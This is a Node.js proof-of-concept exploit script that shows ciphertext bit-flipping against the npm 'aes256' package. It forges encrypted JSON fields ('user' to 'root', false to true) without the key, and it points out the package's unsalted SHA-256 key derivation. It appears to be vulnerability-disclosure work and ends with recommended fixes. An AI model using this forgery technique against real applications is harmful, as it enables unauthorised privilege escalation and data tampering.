#!/usr/bin/env node
// CipherFlip — Ciphertext Bit-Flipping in npm `aes256` (35k downloads/week)
//
// The `aes256` npm package encrypts data with AES-256-CTR but provides NO
// authentication (no HMAC, no GCM tag). CTR mode XORs a keystream with the
// plaintext, making the ciphertext trivially malleable: if an attacker knows
// the plaintext at any position, they can XOR the corresponding ciphertext
// bytes to produce any desired plaintext — and the library happily decrypts
// the tampered data with no error.
//
// This PoC demonstrates a practical privilege-escalation attack: an encrypted
// JSON payload {"role":"user"} is forged to {"role":"root"} by flipping 4
// bytes in the ciphertext — without knowing the encryption key.
//
// Additionally, the KDF is a single unsalted SHA-256 hash — the same password
// always produces the same key, making it vulnerable to rainbow tables.
//
// CWE-327 (Use of Broken Crypto Algorithm), CWE-353 (Missing Integrity Check)
//
// Run: node poc.js  (from the CipherFlip directory)

const aes256 = require('aes256');

const SECRET_KEY = 'my-application-secret-key-2026';

function hexDump(buf, label) {
  const hex = buf.toString('hex').match(/.{1,2}/g).join(' ');
  console.log(`  ${label}: ${hex}`);
}

console.log('='.repeat(80));
console.log('CipherFlip: Ciphertext Bit-Flipping in npm `aes256` (35k downloads/week)');
console.log('='.repeat(80));

// --- DEMO 1: Privilege escalation via bit-flip ---
console.log('\n--- DEMO 1: Privilege Escalation ---\n');

const original = '{"role":"user","name":"alice","canDelete":false}';
console.log(`Original plaintext: ${original}`);

const encrypted = aes256.encrypt(SECRET_KEY, original);
const encBuf = Buffer.from(encrypted, 'base64');
console.log(`Encrypted (base64): ${encrypted.substring(0, 60)}...`);
console.log(`  First 16 bytes = random IV, rest = AES-CTR ciphertext`);
console.log(`  NO authentication tag — library has no integrity check\n`);

// In AES-CTR: ciphertext[i] = plaintext[i] XOR keystream[i]
// To change plaintext[i] from A to B: ciphertext[i] ^= A ^ B
// We know "user" starts at byte offset 9 in the JSON (after {"role":")

const ROLE_OFFSET = 9; // position of 'u' in 'user' within the plaintext
const IV_SIZE = 16;     // first 16 bytes are the IV

const tampered = Buffer.from(encBuf); // copy

// Flip 'user' → 'root' in the ciphertext
const oldBytes = Buffer.from('user');
const newBytes = Buffer.from('root');
for (let i = 0; i < 4; i++) {
  tampered[IV_SIZE + ROLE_OFFSET + i] ^= oldBytes[i] ^ newBytes[i];
}

console.log('Attacker XORs 4 ciphertext bytes to change "user" → "root":');
for (let i = 0; i < 4; i++) {
  const pos = IV_SIZE + ROLE_OFFSET + i;
  console.log(`  byte[${pos}]: 0x${encBuf[pos].toString(16).padStart(2,'0')} ⊕ 0x${(oldBytes[i] ^ newBytes[i]).toString(16).padStart(2,'0')} → 0x${tampered[pos].toString(16).padStart(2,'0')}`);
}

const tamperedB64 = tampered.toString('base64');
const decrypted = aes256.decrypt(SECRET_KEY, tamperedB64);

console.log(`\nTampered ciphertext decrypts to: ${decrypted}`);
const parsed = JSON.parse(decrypted);
console.log(`  role = "${parsed.role}"  ← FORGED from "user" to "root"!`);
console.log(`  name = "${parsed.name}" ← unchanged`);
console.log(`  canDelete = ${parsed.canDelete} ← unchanged`);

if (parsed.role === 'root') {
  console.log('\n  [EXPLOITED] Privilege escalation successful!');
  console.log('  The library decrypted tampered data with NO error or warning.');
} else {
  console.log('\n  [ERROR] Flip did not work as expected');
  process.exit(1);
}

// --- DEMO 2: Boolean flip (false → true) ---
console.log('\n--- DEMO 2: Boolean Flip ---\n');

const payload2 = '{"admin":false,"id":42}';
console.log(`Original: ${payload2}`);

const enc2 = aes256.encrypt(SECRET_KEY, payload2);
const buf2 = Buffer.from(enc2, 'base64');

// "false" at offset 9, we want "true " (with trailing space to keep length)
const tampered2 = Buffer.from(buf2);
const oldVal = Buffer.from('false');
const newVal = Buffer.from('true ');  // space maintains JSON structure
for (let i = 0; i < 5; i++) {
  tampered2[IV_SIZE + 9 + i] ^= oldVal[i] ^ newVal[i];
}

const dec2 = aes256.decrypt(SECRET_KEY, tampered2.toString('base64'));
console.log(`Tampered:  ${dec2}`);
console.log(`  admin = ${JSON.parse(dec2).admin}  ← FORGED from false to true!`);

// --- DEMO 3: Deterministic key derivation (unsalted SHA-256) ---
console.log('\n--- DEMO 3: Unsalted KDF ---\n');

const msg = 'sensitive data';
const enc_a = aes256.encrypt(SECRET_KEY, msg);
const enc_b = aes256.encrypt(SECRET_KEY, msg);

// Different IVs = different ciphertexts, but the KEY is always the same
const iv_a = Buffer.from(enc_a, 'base64').subarray(0, 16);
const iv_b = Buffer.from(enc_b, 'base64').subarray(0, 16);
console.log(`Same password → same AES key (SHA256 with no salt):`);
console.log(`  Encryption 1 IV: ${iv_a.toString('hex')}`);
console.log(`  Encryption 2 IV: ${iv_b.toString('hex')}`);
console.log(`  IVs differ (random), but derived key is identical`);
console.log(`  → Rainbow tables can precompute SHA256(password) → AES key`);
console.log(`  → No key stretching (PBKDF2/scrypt/argon2) = fast brute-force`);

// Summary
console.log('\n' + '='.repeat(80));
console.log('VULNERABILITY SUMMARY:');
console.log('  Package:     aes256 v1.1.0 (npm, 35k downloads/week)');
console.log('  Algorithm:   AES-256-CTR');
console.log('  Issue 1:     NO authentication (CWE-353) — ciphertext is malleable');
console.log('               Attacker can flip arbitrary plaintext bytes without the key');
console.log('  Issue 2:     Unsalted SHA-256 KDF (CWE-916) — no key stretching,');
console.log('               same password always derives same key');
console.log('  Impact:      Privilege escalation, data forgery, integrity bypass');
console.log('  Fix:         Use AES-256-GCM (authenticated encryption) + PBKDF2/scrypt');
console.log('  Alternative: Use `cryptr` (756k dl/wk) which does AES-GCM + PBKDF2');
console.log('='.repeat(80));
